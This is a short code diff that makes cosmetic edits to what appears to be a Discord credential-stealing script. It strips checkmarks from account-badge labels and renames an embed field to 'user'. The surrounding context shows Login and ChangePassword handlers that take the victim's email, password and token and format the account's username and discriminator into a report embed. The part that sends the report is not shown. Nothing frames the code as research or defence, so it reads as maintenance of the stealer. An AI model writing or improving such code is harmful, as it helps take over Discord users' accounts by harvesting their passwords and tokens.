@@ -157,16 +157,16 @@ function GetBadges(flags) {
 		badges += "partnered server owner "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "✔hypesquad events "
+		badges += "hypesquad events "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "✔bug hunter tier 1 "
+		badges += "bug hunter tier 1 "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "✔early supporter "
+		badges += "early supporter "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "✔bug hunter tier 2 "
+		badges += "bug hunter tier 2 "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
 		badges += "verified bot developer "
@@ -197,7 +197,7 @@ function Login(email, password, token) {
                     "color": config["clr"],
                     "fields": [
                         {
-                            "name": "name",
+                            "name": "user",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
@@ -284,7 +284,7 @@ function ChangePassword(email, newpassword, token) {
                     "color": config["clr"],
                     "fields": [
                         {
-                            "name": "name",
+                            "name": "user",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
